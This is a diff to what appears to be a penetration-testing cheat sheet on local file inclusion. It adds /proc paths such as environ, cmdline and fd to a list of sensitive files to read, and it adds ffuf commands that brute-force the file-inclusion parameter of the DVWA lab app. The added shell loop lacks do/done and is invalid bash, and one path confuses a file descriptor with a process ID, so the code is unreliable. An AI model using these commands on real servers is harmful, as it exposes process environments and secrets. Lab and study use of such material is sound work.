@@ -51,16 +51,26 @@ phpinfo.php
 /etc/ssh/sshd_config
 
 /proc/self/cmdline
+/proc/<pid>/cmdline
+
 /proc/self/environ
+/proc/<pid>/environ
+
+/proc/self/cwd
+/proc/<pid>/cwd
+
+/proc/self/fd/<pid>
+
 /proc/self/stat
 /proc/self/status
 /proc/mounts
 ```
 
 ```
-$ seq 1 100000 > pids.txt
+$ ffuf -u "http://dvwa.local/dvwa/vulnerabilities/fi/?page=FUZZ" -b "PHPSESSID=<PHP_cookie_session_ID>;security=low" -c -w <(for i in $(seq 10000); echo "/proc/$i/cmdline") -mc 200
 
-$ ffuf -u "http://dvwa.local/dvwa/vulnerabilities/fi/?page=FUZZ" -b "PHPSESSID=<PHP_cookie_session_ID>;security=low" -c -w pids.txt -mc 200
+
+$ ffuf -u "http://dvwa.local/dvwa/vulnerabilities/fi/?page=FUZZ" -b "PHPSESSID=<PHP_cookie_session_ID>;security=low" -c -w <(for i in $(seq 10000); echo "/proc/$i/fd") -mc 200
 ```
 
 ### Windows
